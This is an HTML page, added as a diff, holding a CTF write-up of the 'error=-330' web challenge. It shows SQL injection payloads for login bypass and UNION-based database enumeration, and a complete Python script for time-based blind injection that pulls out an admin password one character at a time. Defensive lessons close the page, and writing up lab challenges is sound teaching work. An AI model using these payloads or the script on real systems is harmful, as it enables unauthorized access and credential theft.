@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="../../../css/style.css" />
+  <link rel="stylesheet" href="../../../css/writeup.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <title>error=-330 | CTF Writeup</title>
+  <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+</head>
+
+<body>
+  <div class="theme-switch-wrapper">
+    <label class="theme-switch" for="checkbox">
+      <input type="checkbox" id="checkbox" />
+      <div class="slider round"></div>
+    </label>
+    <em>Light / Dark</em>
+  </div>
+
+  <header class="writeup-header">
+    <div class="writeup-nav">
+      <a href="../../index.html" class="back-link"><i class="fas fa-chevron-left"></i> Back to Writeups</a>
+      <h1 class="writeup-title">error=-330</h1>
+      <div class="writeup-meta">
+        <span class="writeup-badge web">Web Exploitation</span>
+        <span class="writeup-date">UVTCTF 2025</span>
+        <span class="writeup-difficulty">Medium</span>
+      </div>
+    </div>
+  </header>
+
+  <main class="writeup-container">
+    <div class="writeup-sidebar">
+      <div class="writeup-toc">
+        <h3>Table of Contents</h3>
+        <ul class="toc-list">
+          <li><a href="#challenge-description">Challenge Description</a></li>
+          <li><a href="#reconnaissance">Reconnaissance</a></li>
+          <li><a href="#enumeration">Database Enumeration</a></li>
+          <li><a href="#blind-injection">Blind SQL Injection</a></li>
+          <li><a href="#solution">Solution</a></li>
+          <li><a href="#lessons-learned">Lessons Learned</a></li>
+        </ul>
+      </div>
+      
+      <div class="writeup-tools">
+        <h3>Tools Used</h3>
+        <ul class="tools-list">
+          <li><i class="fas fa-code"></i> Python</li>
+          <li><i class="fas fa-globe"></i> Requests</li>
+          <li><i class="fas fa-clock"></i> Time-based Analysis</li>
+        </ul>
+      </div>
+    </div>
+
+    <article class="writeup-content">
+      <section id="challenge-description">
+        <h2>Challenge Description</h2>
+        <div class="challenge-info">
+          <p>You don't ask for access. You carve it out.</p>
+          
+          <div class="challenge-details">
+            <div class="challenge-detail">
+              <span class="detail-label">Author:</span>
+              <span class="detail-value">AndraB</span>
+            </div>
+            <div class="challenge-detail">
+              <span class="detail-label">Points:</span>
+              <span class="detail-value">330</span>
+            </div>
+            <div class="challenge-detail">
+              <span class="detail-label">Category:</span>
+              <span class="detail-value">Web</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section id="reconnaissance">
+        <h2>Reconnaissance</h2>
+        <p>The challenge presents a web application with a login form. My first step was to examine this login page for potential vulnerabilities.</p>
+        
+        <p>The login form seemed like a good target to attempt some basic SQL injection. I tried the classic <code>' or 1=1 --</code> payload in both username and password fields, which bypassed the authentication successfully. This indicated poor input validation and a likely SQL injection vulnerability.</p>
+        
+        <div class="image-container">
+          <img src="img/writeups/login-injection.png" alt="Login page with SQL injection" class="writeup-image">
+          <figcaption>Login page with SQL injection vulnerability</figcaption>
+        </div>
+        
+        <p>After bypassing authentication, I had access to a product search functionality. This seemed like another potential entry point for SQL injection that I could use to extract information from the database.</p>
+      </section>
+
+      <section id="enumeration">
+        <h2>Database Enumeration</h2>
+        <p>The product search functionality was indeed vulnerable to SQL injection. I used this to systematically enumerate the database structure:</p>
+        
+        <p>First, I determined the number of columns in the current query by using the <code>UNION SELECT</code> technique:</p>
+        
+        <pre><code class="language-sql">' UNION SELECT NULL,NULL,NULL,NULL --</code></pre>
+        
+        <p>This indicated that the query was returning 4 columns. Next, I wanted to discover the table names in the database:</p>
+        
+        <pre><code class="language-sql">' UNION SELECT NULL, table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database() --</code></pre>
+        
+        <p>This query revealed two tables: <code>products</code> and <code>secrets</code>. The <code>secrets</code> table seemed particularly interesting for finding the flag.</p>
+        
+        <p>To investigate the structure of the <code>secrets</code> table, I queried for its column names:</p>
+        
+        <pre><code class="language-sql">' UNION SELECT NULL, column_name, NULL, NULL FROM information_schema.columns WHERE table_name='secrets' --</code></pre>
+        
+        <p>This revealed two columns: <code>id</code> and <code>flag</code>. Now I could directly query for the flag:</p>
+        
+        <pre><code class="language-sql">' UNION SELECT NULL, flag, NULL, NULL FROM secrets --</code></pre>
+        
+        <p>This query returned the first part of the flag: <code>UVT{Th3_sy5t3M_7ru5Ts_1tS_oWn_9r4Mmar_..._</code></p>
+        
+        <div class="image-container">
+          <img src="img/writeups/first-part-flag.png" alt="First part of the flag" class="writeup-image">
+          <figcaption>Extracting the first part of the flag</figcaption>
+        </div>
+        
+        <p>However, the flag appeared to be incomplete. I needed to find the second part somewhere else in the application.</p>
+      </section>
+
+      <section id="blind-injection">
+        <h2>Blind SQL Injection</h2>
+        <p>After examining the application further, I found a "Forgot Password" feature. This led to a password reset form that asked for an email address. Since there were no direct error messages or responses that would reveal SQL injection, I suspected this might require a blind SQL injection technique.</p>
+        
+        <p>For blind SQL injection, I needed to use time-based techniques to infer information. I crafted a payload that would cause the server to sleep for 5 seconds if a specific condition was true:</p>
+        
+        <pre><code class="language-sql">' OR (SELECT IF(SUBSTRING(BINARY (SELECT password FROM users WHERE username='admin' LIMIT 1),1,1)='a', SLEEP(5), 0))-- </code></pre>
+        
+        <p>If the first character of the admin's password was 'a', the server would sleep for 5 seconds. By iterating through different characters and positions, I could extract the password character by character.</p>
+        
+        <p>To automate this process, I wrote a Python script using the requests library:</p>
+        
+        <pre><code class="language-python">import requests
+import string
+import time
+
+URL = 'http://challenge.uvtctf.ro:8080/password_reset.php'  
+DELAY = 5
+THRESHOLD = 4.5
+CHARSET = string.ascii_letters + string.digits + "!@#$%^&*()_+-={}[]|:;<>,.?/~`"  
+MAX_LENGTH = 40
+TARGET_CONDITION = "username='admin'"
+
+extracted = ''
+
+print("[*] Starting Blind SQL Injection...")
+
+for position in range(1, MAX_LENGTH + 1):
+    found_char = False
+    for char in CHARSET:
+        payload = (
+            f"' OR (SELECT IF(SUBSTRING(BINARY (SELECT password FROM users WHERE {TARGET_CONDITION} LIMIT 1),"
+            f"{position},1)='{char}', SLEEP({DELAY}), 0))-- "
+        )
+
+        data = {
+            'email': payload
+        }
+
+        start_time = time.time()
+        try:
+            response = requests.post(URL, data=data, timeout=DELAY + 2)
+            elapsed = time.time() - start_time
+        except requests.exceptions.Timeout:
+            elapsed = DELAY + 1
+
+        if elapsed > THRESHOLD:
+            extracted += char
+            print(f"[+] Found character at position {position}: {char}")
+            found_char = True
+            break
+
+    if not found_char:
+        print(f"[-] No more characters found at position {position}. Ending extraction.")
+        break
+
+print(f"\n[*] Extraction complete! Retrieved password: {extracted}")
+</code></pre>
+        
+        <p>Running this script gradually extracted the second part of the flag: <code>S0_5tR1ng5_4r3_m0r3_tHaN_qu3r13s_1n_th3_3nd</code></p>
+      </section>
+
+      <section id="solution">
+        <h2>Solution</h2>
+        <p>By combining the two parts of the flag, I obtained the complete flag:</p>
+        
+        <div class="flag-container">
+          <code>UVT{Th3_sy5t3M_7ru5Ts_1tS_oWn_9r4Mmar_..._S0_5tR1ng5_4r3_m0r3_tHaN_qu3r13s_1n_th3_3nd}</code>
+        </div>
+        
+        <p>The challenge was solved using several SQL injection techniques:</p>
+        <ol>
+          <li>Basic authentication bypass using <code>' or 1=1 --</code></li>
+          <li>UNION-based injection to enumerate database structure</li>
+          <li>Direct data extraction for the first part of the flag</li>
+          <li>Time-based blind SQL injection to extract the second part of the flag</li>
+        </ol>
+      </section>
+
+      <section id="lessons-learned">
+        <h2>Lessons Learned</h2>
+        <p>This challenge highlights several important security concepts:</p>
+        <ul>
+          <li>The dangers of unsanitized user input in SQL queries</li>
+          <li>How attackers can systematically enumerate and extract sensitive data from databases</li>
+          <li>The importance of proper input validation and parameterized queries</li>
+          <li>How blind SQL injection can be used even when there's no direct output</li>
+          <li>The role of time-based techniques in blind injection scenarios</li>
+        </ul>
+        
+        <p>For developers, this challenge emphasizes the importance of:</p>
+        <ul>
+          <li>Using prepared statements or parameterized queries instead of concatenating user input</li>
+          <li>Implementing proper authentication mechanisms</li>
+          <li>Applying the principle of least privilege for database accounts</li>
+          <li>Setting up input validation at multiple levels</li>
+          <li>Using web application firewalls to detect and block SQL injection attempts</li>
+        </ul>
+        
+        <div class="resources">
+          <h3>Additional Resources</h3>
+          <ul>
+            <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection Guide</a></li>
+            <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger SQL Injection Tutorial</a></li>
+            <li><a href="https://github.com/payloadbox/sql-injection-payload-list" target="_blank">SQL Injection Payload List</a></li>
+          </ul>
+        </div>
+      </section>
+    </article>
+  </main>
+
+  <footer class="writeup-footer">
+    <div class="footer-content">
+      <div class="footer-nav">
+        <a href="../jwt-authentication-bypass/index.html" class="prev-writeup"><i class="fas fa-arrow-left"></i> Previous Writeup</a>
+        <a href="../../index.html" class="all-writeups">All Writeups</a>
+        <a href="../rsa-key-recovery/index.html" class="next-writeup">Next Writeup <i class="fas fa-arrow-right"></i></a>
+      </div>
+      <div class="footer-info">
+        <p>&copy; 2025 Razvan Radutoiu. All rights reserved.</p>
+      </div>
+    </div>
+  </footer>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <script src="../../../js/writeup.js"></script>
+</body>
+
+</html>
